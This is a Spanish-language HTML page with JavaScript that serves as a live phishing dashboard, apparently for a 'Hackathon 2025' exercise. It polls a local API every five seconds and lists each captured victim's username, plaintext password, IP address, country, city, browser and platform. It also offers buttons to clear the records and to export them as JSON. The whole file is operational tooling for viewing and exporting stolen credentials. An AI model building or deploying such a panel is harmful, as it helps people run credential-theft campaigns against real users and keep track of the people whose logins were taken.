<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - V√≠ctimas Capturadas</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff00;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
            padding: 30px;
            background: #1a1a1a;
            border-radius: 10px;
            border: 2px solid #00ff00;
            box-shadow: 0 0 20px rgba(0,255,0,0.3);
        }
        
        .header h1 {
            font-size: 42px;
            text-shadow: 0 0 10px #00ff00;
            margin-bottom: 10px;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: #1a1a1a;
            padding: 25px;
            border-radius: 8px;
            border: 1px solid #00ff00;
            text-align: center;
            transition: all 0.3s;
        }
        
        .stat-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 5px 20px rgba(0,255,0,0.4);
        }
        
        .stat-card h3 {
            font-size: 14px;
            color: #00ff00;
            margin-bottom: 15px;
            text-transform: uppercase;
        }
        
        .stat-card .number {
            font-size: 36px;
            font-weight: bold;
            color: #00ff00;
        }
        
        .controls {
            margin-bottom: 20px;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        
        button {
            background: #00ff00;
            color: #0a0a0a;
            border: none;
            padding: 12px 24px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            font-size: 14px;
            transition: all 0.3s;
        }
        
        button:hover {
            background: #00cc00;
            transform: scale(1.05);
        }
        
        .victims-table {
            background: #1a1a1a;
            padding: 25px;
            border-radius: 8px;
            border: 1px solid #00ff00;
            overflow-x: auto;
        }
        
        .victims-table h2 {
            margin-bottom: 20px;
            font-size: 24px;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 14px;
        }
        
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #333;
        }
        
        th {
            background: #0a0a0a;
            font-weight: bold;
            text-transform: uppercase;
            font-size: 12px;
        }
        
        tr:hover {
            background: #2a2a2a;
        }
        
        .loading {
            text-align: center;
            padding: 40px;
            font-size: 20px;
        }
        
        .password {
            color: #ffff00;
            font-weight: bold;
        }
        
        .status {
            display: inline-block;
            padding: 2px 8px;
            background: rgba(0,255,0,0.2);
            border-radius: 3px;
            font-size: 11px;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>üéØ PHISHING DASHBOARD</h1>
        <p>Monitoreo en Tiempo Real - Hackathon 2025</p>
    </div>
    
    <div class="controls">
        <button onclick="loadData()">üîÑ Actualizar</button>
        <button onclick="clearData()" style="background: #ff3333;">üóëÔ∏è Limpiar Datos</button>
        <button onclick="exportData()">üíæ Exportar JSON</button>
    </div>
    
    <div class="stats">
        <div class="stat-card">
            <h3>V√≠ctimas Totales</h3>
            <div class="number" id="totalVictims">0</div>
        </div>
        <div class="stat-card">
            <h3>Pa√≠ses √önicos</h3>
            <div class="number" id="uniqueCountries">0</div>
        </div>
        <div class="stat-card">
            <h3>Ciudades √önicas</h3>
            <div class="number" id="uniqueCities">0</div>
        </div>
        <div class="stat-card">
            <h3>√öltima Captura</h3>
            <div class="number" id="lastCapture" style="font-size: 16px;">-</div>
        </div>
    </div>
    
    <div class="victims-table">
        <h2>üìã Registro de V√≠ctimas</h2>
        <div id="tableContainer" class="loading">Cargando datos...</div>
    </div>

    <script>
        let autoRefresh = true;
        
        async function loadData() {
            try {
                const response = await fetch('/api/victims');
                const victims = await response.json();
                
                // Actualizar estad√≠sticas
                document.getElementById('totalVictims').textContent = victims.length;
                
                const uniqueCountries = [...new Set(victims.map(v => v.country))];
                document.getElementById('uniqueCountries').textContent = uniqueCountries.length;
                
                const uniqueCities = [...new Set(victims.map(v => v.city))];
                document.getElementById('uniqueCities').textContent = uniqueCities.length;
                
                if (victims.length > 0) {
                    const lastVictim = victims[victims.length - 1];
                    const timeAgo = getTimeAgo(new Date(lastVictim.timestamp));
                    document.getElementById('lastCapture').textContent = timeAgo;
                }
                
                // Crear tabla
                if (victims.length === 0) {
                    document.getElementById('tableContainer').innerHTML = 
                        '<p class="loading">No hay v√≠ctimas capturadas a√∫n. Esperando conexiones...</p>';
                } else {
                    let tableHTML = `
                        <table>
                            <thead>
                                <tr>
                                    <th>#</th>
                                    <th>üë§ Usuario</th>
                                    <th>üîë Contrase√±a</th>
                                    <th>üåê IP</th>
                                    <th>üåç Pa√≠s</th>
                                    <th>üèôÔ∏è Ciudad</th>
                                    <th>üíª Navegador</th>
                                    <th>üì± Plataforma</th>
                                    <th>üïê Fecha</th>
                                </tr>
                            </thead>
                            <tbody>
                    `;
                    
                    victims.reverse().forEach((victim, index) => {
                        const browser = getBrowser(victim.userAgent);
                        const date = new Date(victim.timestamp).toLocaleString('es-MX');
                        
                        tableHTML += `
                            <tr>
                                <td><span class="status">${victims.length - index}</span></td>
                                <td><strong>${victim.username}</strong></td>
                                <td class="password">${victim.password}</td>
                                <td>${victim.ip}</td>
                                <td>${victim.country}</td>
                                <td>${victim.city}</td>
                                <td>${browser}</td>
                                <td>${victim.platform || 'N/A'}</td>
                                <td>${date}</td>
                            </tr>
                        `;
                    });
                    
                    tableHTML += '</tbody></table>';
                    document.getElementById('tableContainer').innerHTML = tableHTML;
                }
                
            } catch (error) {
                console.error('Error:', error);
                document.getElementById('tableContainer').innerHTML = 
                    '<p class="loading">‚ùå Error al cargar datos. Verifica que el servidor est√© activo.</p>';
            }
        }
        
        function getBrowser(userAgent) {
            if (!userAgent) return '‚ùì Unknown';
            const ua = userAgent.toLowerCase();
            if (ua.includes('chrome')) return 'üåê Chrome';
            if (ua.includes('firefox')) return 'ü¶ä Firefox';
            if (ua.includes('safari')) return 'üß≠ Safari';
            if (ua.includes('edge')) return 'üåä Edge';
            if (ua.includes('opera')) return 'üé≠ Opera';
            return '‚ùì Otro';
        }
        
        function getTimeAgo(date) {
            const seconds = Math.floor((new Date() - date) / 1000);
            
            if (seconds < 60) return 'Hace ' + seconds + ' seg';
            if (seconds < 3600) return 'Hace ' + Math.floor(seconds / 60) + ' min';
            if (seconds < 86400) return 'Hace ' + Math.floor(seconds / 3600) + ' hrs';
            return 'Hace ' + Math.floor(seconds / 86400) + ' d√≠as';
        }
        
        async function clearData() {
            if (confirm('¬øSeguro que quieres eliminar TODOS los datos capturados?')) {
                try {
                    await fetch('/api/clear', { method: 'DELETE' });
                    alert('‚úÖ Datos eliminados correctamente');
                    loadData();
                } catch (error) {
                    alert('‚ùå Error al eliminar datos');
                }
            }
        }
        
        async function exportData() {
            try {
                const response = await fetch('/api/victims');
                const victims = await response.json();
                
                const dataStr = JSON.stringify(victims, null, 2);
                const dataBlob = new Blob([dataStr], { type: 'application/json' });
                
                const url = URL.createObjectURL(dataBlob);
                const link = document.createElement('a');
                link.href = url;
                link.download = `victims_${new Date().toISOString()}.json`;
                link.click();
            } catch (error) {
                alert('‚ùå Error al exportar datos');
            }
        }
        
        // Cargar datos al inicio
        loadData();
        
        // Auto-refresh cada 5 segundos
        setInterval(() => {
            if (autoRefresh) {
                loadData();
            }
        }, 5000);
    </script>
</body>
</html>
